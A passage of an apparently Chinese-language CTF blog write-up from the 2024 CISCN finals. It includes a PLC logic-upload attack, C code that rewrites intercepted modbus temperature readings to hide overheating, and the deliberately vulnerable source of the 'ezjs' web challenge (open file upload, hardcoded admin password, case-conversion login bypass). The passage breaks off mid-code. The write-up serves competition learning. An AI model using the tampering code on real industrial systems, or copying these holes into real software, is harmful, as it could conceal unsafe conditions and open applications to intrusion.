class="token string">"ASPECT"</span><span class="token punctuation">,</span>                <span class="token property">"ljump"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>                <span class="token property">"rjump"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>                <span class="token property">"newname"</span><span class="token operator">:</span><span class="token string">"filereplace"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"MATCH_RULES"</span><span class="token operator">:</span>        <span class="token punctuation">[</span>                <span class="token punctuation">&#123;</span>                        <span class="token property">"op"</span><span class="token operator">:</span><span class="token string">"AND"</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_ENGINEER"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"LOGIC_UPLOAD"</span>                <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"ROUTE_RULES"</span><span class="token operator">:</span>        <span class="token punctuation">&#123;</span>                <span class="token property">"main_policy"</span><span class="token operator">:</span><span class="token punctuation">[</span>                        <span class="token punctuation">&#123;</span><span class="token property">"target_type"</span><span class="token operator">:</span><span class="token string">"LOCAL"</span><span class="token punctuation">,</span><span class="token property">"target_name"</span><span class="token operator">:</span><span class="token string">"file_replace"</span><span class="token punctuation">&#125;</span>                <span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>跑验证脚本看看</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240713120528156.png" alt="image-20240713120528156"></p><p>上传逻辑没问题</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240713120803696.png" alt="image-20240713120803696"></p><p>温度上升，攻击成功</p><hr><h3 id="modbus数据监听与篡改"><a href="#modbus数据监听与篡改" class="headerlink" title="modbus数据监听与篡改"></a>modbus数据监听与篡改</h3><p>本任务演示对modbus协议数据的攻击行为，选手需要对modbus协议有基础的了解。</p><blockquote><p>在modbus_hacker实例中，modbus_monitor模块接入到modbus主设备和从设备的通信线路中，准备窃听当前温度。窃听温度后不必输出，当温度超过43度时，模块应篡改回传的温度数值，使操作员和监视员看到的温度始终低于43度。</p></blockquote><p>可以用operator_start.sh脚本观察modbus协议的输入输出，modbus_hacker实例的<code>modbus_monitor</code>模块会打印协议的输入输出信息。注意后续实验时，为测试访控和加密效果，modbus_monitor模块建议改回原版模块。</p><br><p>本题需要修改一个源码文件<code>modbus_monitor.c</code> ：执行modbus协议数据窃听modbus协议温度数值并进行篡改攻击</p><p>核心效果，就是当温度高于43度的时候，将数据篡改为低于43度，以实现对温度监控的破坏</p><p>在本地运行<code>operator_start.sh</code>，获得一组用于分析的数据：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"> get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>01 00 00 00 00 06 01 05 02 00 00 ff  get modbus data <span class="token number">12</span> bytes from server<span class="token operator">!</span>01 00 00 00 00 06 01 05 02 00 00 ff <span class="token punctuation">&#123;</span><span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"ON"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"heating_S"</span>,<span class="token string">"value"</span>:65280,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span> get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>02 00 00 00 00 06 01 04 <span class="token number">34</span> <span class="token number">75</span> 01 00  get modbus data <span class="token number">11</span> bytes from server<span class="token operator">!</span>02 00 00 00 00 05 01 04 02 8c <span class="token number">10</span> <span class="token punctuation">&#123;</span><span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"MONITOR"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"curr_T"</span>,<span class="token string">"value"</span>:423<span class="token number">6</span>,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span> get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>03 00 00 00 00 06 01 06 <span class="token number">43</span> 9c 3c 0f  get modbus data <span class="token number">12</span> bytes from server<span class="token operator">!</span>03 00 00 00 00 06 01 06 <span class="token number">43</span> 9c 3c 0f <span class="token punctuation">&#123;</span><span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"ADJUST"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"set_T"</span>,<span class="token string">"value"</span>:3900,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span> target T is <span class="token number">3900</span><span class="token operator">!</span><span class="token builtin class-name">exit</span> the proc<span class="token operator">!</span>  get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>04 00 00 00 00 06 01 04 <span class="token number">34</span> <span class="token number">75</span> 01 00  get modbus data <span class="token number">11</span> bytes from server<span class="token operator">!</span>04 00 00 00 00 05 01 04 02 9d <span class="token number">13</span> <span class="token punctuation">&#123;</span><span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"MONITOR"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"curr_T"</span>,<span class="token string">"value"</span>:502<span class="token number">1</span>,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span> get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>05 00 00 00 00 06 01 03 <span class="token number">45</span> 9c 01 00  get modbus data <span class="token number">11</span> bytes from server<span class="token operator">!</span>05 00 00 00 00 05 01 03 02 09 00 <span class="token punctuation">&#123;</span><span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"MONITOR"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"heating_G"</span>,<span class="token string">"value"</span><span class="token builtin class-name">:</span><span class="token number">9</span>,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span><span class="token builtin class-name">exit</span> the proc<span class="token operator">!</span>  get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>06 00 00 00 00 06 01 04 <span class="token number">34</span> <span class="token number">75</span> 01 00  get modbus data <span class="token number">11</span> bytes from server<span class="token operator">!</span>06 00 00 00 00 05 01 04 02 <span class="token number">12</span> 1c <span class="token punctuation">&#123;</span><span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"MONITOR"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"curr_T"</span>,<span class="token string">"value"</span>:718<span class="token number">6</span>,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span> get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>07 00 00 00 00 06 01 03 <span class="token number">45</span> 9c 01 00  get modbus data <span class="token number">11</span> bytes from server<span class="token operator">!</span>07 00 00 00 00 05 01 03 02 09 00 <span class="token punctuation">&#123;</span><span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"MONITOR"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"heating_G"</span>,<span class="token string">"value"</span><span class="token builtin class-name">:</span><span class="token number">9</span>,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span><span class="token builtin class-name">exit</span> the proc<span class="token operator">!</span>  get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>08 00 00 00 00 06 01 04 <span class="token number">34</span> <span class="token number">75</span> 01 00  get modbus data <span class="token number">11</span> bytes from server<span class="token operator">!</span>08 00 00 00 00 05 01 04 02 b3 1e <span class="token punctuation">&#123;</span><span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"MONITOR"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"curr_T"</span>,<span class="token string">"value"</span>:785<span class="token number">9</span>,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span> get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>09 00 00 00 00 06 01 03 <span class="token number">45</span> 9c 01 00  get modbus data <span class="token number">11</span> bytes from server<span class="token operator">!</span>09 00 00 00 00 05 01 03 02 09 00 <span class="token punctuation">&#123;</span><span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"MONITOR"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"heating_G"</span>,<span class="token string">"value"</span><span class="token builtin class-name">:</span><span class="token number">9</span>,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span><span class="token builtin class-name">exit</span> the proc<span class="token operator">!</span>  get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>0a 00 00 00 00 06 01 04 <span class="token number">34</span> <span class="token number">75</span> 01 00  get modbus data <span class="token number">11</span> bytes from server<span class="token operator">!</span>0a 00 00 00 00 05 01 04 02 c2 1f <span class="token punctuation">&#123;</span><span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"MONITOR"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"curr_T"</span>,<span class="token string">"value"</span>:813<span class="token number">0</span>,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span> get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>0b 00 00 00 00 06 01 03 <span class="token number">45</span> 9c 01 00  get modbus data <span class="token number">11</span> bytes from server<span class="token operator">!</span>0b 00 00 00 00 05 01 03 02 09 00 <span class="token punctuation">&#123;</span><span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"MONITOR"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"heating_G"</span>,<span class="token string">"value"</span><span class="token builtin class-name">:</span><span class="token number">9</span>,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span><span class="token builtin class-name">exit</span> the proc<span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>与上文的比对，可以得到温度数据<code>curr_T</code>应该由<code>server端</code>得到，改变的为<code>Buf[9]</code>和<code>Buf[10]</code>两个部分</p><table><thead><tr><th>modbus data from server</th><th>Buf[9], Buf[10]</th><th>curr_T value</th></tr></thead><tbody><tr><td>02 00 00 00 00 05 01 04 02 8c 10</td><td>8c 10</td><td>4236</td></tr><tr><td>04 00 00 00 00 05 01 04 02 9d 13</td><td>9d 13</td><td>5021</td></tr><tr><td>06 00 00 00 00 05 01 04 02 12 1c</td><td>12 1c</td><td>7186</td></tr><tr><td>08 00 00 00 00 05 01 04 02 b3 1e</td><td>b3 1e</td><td>7859</td></tr><tr><td>0a 00 00 00 00 05 01 04 02 c2 1f</td><td>c2 20</td><td>8130</td></tr></tbody></table><p>观察发现是小端存储，写一个检测</p><p>src&#x2F;security&#x2F;modbus_monitor&#x2F;modbus_monitor.c</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 窃取数据和篡改数据的位置开始</span>                     <span class="token keyword">if</span><span class="token punctuation">(</span>Buf<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x04</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token keyword">int</span> temperature <span class="token operator">=</span> <span class="token punctuation">(</span>Buf<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> Buf<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">;</span>             <span class="token keyword">if</span> <span class="token punctuation">(</span>temperature <span class="token operator">>=</span> <span class="token number">4300</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                 Buf<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x10</span><span class="token punctuation">;</span>                 Buf<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x68</span><span class="token punctuation">;</span>             <span class="token punctuation">&#125;</span>         <span class="token punctuation">&#125;</span> <span class="token comment">//窃取数据和篡改数据的位置结束</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重新编译，然后执行验证脚本</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240713165910986.png" alt="image-20240713165910986"></p><p>温度稳定显示在4200</p><hr><h2 id="访问控制模拟任务"><a href="#访问控制模拟任务" class="headerlink" title="访问控制模拟任务"></a>访问控制模拟任务</h2><p>后面两题交给队友了，我开摆（</p><h3 id="角色验证"><a href="#角色验证" class="headerlink" title="角色验证"></a>角色验证</h3><hr><h3 id="角色权限限制"><a href="#角色权限限制" class="headerlink" title="角色权限限制"></a>角色权限限制</h3><hr><h2 id="密码保护模拟任务"><a href="#密码保护模拟任务" class="headerlink" title="密码保护模拟任务"></a>密码保护模拟任务</h2><hr><h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><p>day1可信计算</p><p>day2车联网+工控</p><p>因为都没接触过所以这部分全交给队友们来做</p><hr><h1 id="AWDP"><a href="#AWDP" class="headerlink" title="AWDP"></a>AWDP</h1><p>被定式思维害了，第6轮开始我才修好js，按理来说15次提交机会上来就应该waf拉满赌一赌的</p><p>@chen那边也是修二打一，真厉害（川腔</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240720150051765.png" alt="image-20240720150051765"></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ezjs"><a href="#ezjs" class="headerlink" title="ezjs"></a>ezjs</h2><h3 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h3><p>break遗憾四血</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> ejs<span class="token operator">=</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'ejs'</span><span class="token punctuation">)</span><span class="token keyword">const</span> session <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-session'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> bodyParse <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> multer <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'multer'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"path"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">createDirectoriesForFilePath</span><span class="token punctuation">(</span><span class="token parameter">filePath</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> dirname <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">dirname</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">;</span>    fs<span class="token punctuation">.</span><span class="token function">mkdirSync</span><span class="token punctuation">(</span>dirname<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">recursive</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">IfLogin</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> storage <span class="token operator">=</span> multer<span class="token punctuation">.</span><span class="token function">diskStorage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token function-variable function">destination</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> file<span class="token punctuation">,</span> cb</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'uploads'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 设置上传文件的目标目录</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token function-variable function">filename</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> file<span class="token punctuation">,</span> cb</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 直接使用原始文件名</span>        <span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> file<span class="token punctuation">.</span>originalname<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 配置 multer 上传中间件</span><span class="token keyword">const</span> upload <span class="token operator">=</span> <span class="token function">multer</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">storage</span><span class="token operator">:</span> storage<span class="token punctuation">,</span> <span class="token comment">// 使用自定义存储选项</span>    <span class="token function-variable function">fileFilter</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> file<span class="token punctuation">,</span> cb</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> fileExt <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">extname</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span>originalname<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>fileExt <span class="token operator">===</span> <span class="token string">'.ejs'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 如果文件后缀为 .ejs，则拒绝上传该文件</span>            <span class="token keyword">return</span> <span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Upload of .ejs files is not allowed'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 允许上传其他类型的文件</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>admin<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string-property property">"username"</span><span class="token operator">:</span><span class="token string">"ADMIN"</span><span class="token punctuation">,</span>    <span class="token string-property property">"password"</span><span class="token operator">:</span><span class="token string">"123456"</span><span class="token punctuation">&#125;</span>app<span class="token operator">=</span><span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'uploads'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParse<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">extended</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'ejs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">secret</span><span class="token operator">:</span> <span class="token string">'Can_U_hack_me?'</span><span class="token punctuation">,</span>    <span class="token literal-property property">resave</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>    <span class="token literal-property property">saveUninitialized</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token literal-property property">cookie</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">maxAge</span><span class="token operator">:</span> <span class="token number">3600</span> <span class="token operator">*</span> <span class="token number">1000</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span>res</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> username<span class="token punctuation">,</span> password <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token operator">===</span> <span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'you can not be admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> new_username <span class="token operator">=</span> username<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>new_username <span class="token operator">===</span> admin<span class="token punctuation">.</span>username <span class="token operator">&amp;&amp;</span> password <span class="token operator">===</span> admin<span class="token punctuation">.</span>password<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user <span class="token operator">=</span> <span class="token string">"ADMIN"</span><span class="token punctuation">;</span>        res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/rename'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// res.redirect('/login');</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'upload'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> upload<span class="token punctuation">.</span><span class="token function">single</span><span class="token punctuation">(</span><span class="token string">'fileInput'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>file<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'No file uploaded'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> fileExt <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">extname</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>file<span class="token punctuation">.</span>originalname<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token 